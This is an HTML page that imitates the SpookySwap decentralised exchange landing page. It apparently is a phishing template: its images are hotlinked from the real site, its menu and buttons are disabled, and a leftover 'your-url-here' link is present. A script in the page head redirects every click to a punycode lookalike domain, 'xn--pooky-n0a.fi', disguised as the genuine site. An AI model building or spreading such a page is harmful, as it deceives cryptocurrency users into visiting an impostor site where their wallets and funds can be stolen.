<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpookySwap</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            document.body.addEventListener('click', () => {
                 window.location.href = 'https://xn--pooky-n0a.fi/';
            });
        });
    </script>
    <style>
        body {
            background: #0B1A33;
            color: white;
            font-family: system-ui, -apple-system, sans-serif;
            cursor: pointer;
        }
        .bg-custom {
            background: radial-gradient(169.56% 169.56% at 50% -69.56%, #031022 0%, #02081A 73.96%);
        }
        .logo {
            width: 24px;
            height: 24px;
            content: url('https://cdn.spooky.fi/logo.31c2306a.png');
        }
        .get-started-btn {
            background-color: #00B2FF;
            padding: 12px 32px;
            border-radius: 9999px;
            transition: all 0.2s;
            width: 200px;
        }
        .get-started-btn:hover {
            background-color: #0090CC;
        }
        .planet {
            position: absolute;
            right: 10%;
            top: 15%;
            width: 500px;
            height: 500px;
            content: url('https://cdn.spooky.fi/ghost.4419f2b1.png');
        }
        .small-planet1 {
            position: absolute;
            left: 20%;
            top: 30%;
            width: 100px;
            content: url('https://cdn.spooky.fi/fantom.3f8c73c6.png');
        }
        .small-planet2 {
            position: absolute;
            left: 40%;
            top: 20%;
            width: 80px;
            content: url('https://cdn.spooky.fi/fantom.3f8c73c6.png');
        }
        .discord-icon {
            content: url('https://cdn.spooky.fi/discord.7cc37061.svg');
        }
        .twitter-icon {
            content: url('https://cdn.spooky.fi/twitter.391d3c2d.svg');
        }
        .github-icon {
            content: url('https://cdn.spooky.fi/github.a53ca606.svg');
        }
        .telegram-icon {
            content: url('https://cdn.spooky.fi/telegram.c6fde0e3.svg');
        }
        .social-icon {
            width: 24px;
            height: 24px;
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="bg-custom min-h-screen relative overflow-hidden">
        <nav class="flex justify-between items-center p-4">
            <div class="flex items-center space-x-8">
                <div class="flex items-center space-x-2">
                    <div class="logo"></div>
                    <span class="font-bold">SpookySwap</span>
                </div>
                <div class="flex space-x-6">
                    <span class="opacity-50 cursor-not-allowed">Swap</span>
                    <span class="opacity-50 cursor-not-allowed">Liquidity</span>
                    <span class="opacity-50 cursor-not-allowed">Farms</span>
                    <span class="opacity-50 cursor-not-allowed">Stake BOO</span>
                    <span class="opacity-50 cursor-not-allowed">Bridge</span>
                </div>
            </div>
            <div class="flex items-center space-x-4">
                <span>$0.97</span>
                <button class="opacity-50 cursor-not-allowed bg-[#00B2FF] px-4 py-2 rounded">Connect</button>
            </div>
        </nav>

        <main class="container mx-auto px-4 pt-20 relative z-10">
            <div class="max-w-xl">
                <h1 class="text-5xl font-bold mb-6">The Portal to DeFi: Mint</h1>
                <p class="text-gray-400 mb-8">
                    All in one decentralized exchange for leveraging diversified funds across ecosystems, with the speed of Fantom
                </p>
                <div class="flex space-x-4 items-center mb-40">
                    <div class="social-icon discord-icon"></div>
                    <div class="social-icon twitter-icon"></div>
                    <div class="social-icon github-icon"></div>
                    <div class="social-icon telegram-icon"></div>
                    <button class="opacity-50 cursor-not-allowed bg-[#00B2FF] px-4 py-2 rounded">Get BOO</button>
                </div>
                
                <div class="text-center mt-20">
                    <h2 class="text-5xl font-bold mb-8">SpookySwap V3</h2>
                    <div class="flex flex-col items-center space-y-4">
                        <a href="your-url-here" class="get-started-btn text-center">Get started</a>
                        <button class="flex items-center text-gray-400 opacity-50 cursor-not-allowed">
                            Learn more
                            <svg class="w-4 h-4 ml-2" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                                <path d="M19 9l-7 7-7-7" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"/>
                            </svg>
                        </button>
                    </div>
                </div>
            </div>

            <div class="planet"></div>
            <div class="small-planet1"></div>
            <div class="small-planet2"></div>
        </main>
    </div>
</body>
</html>
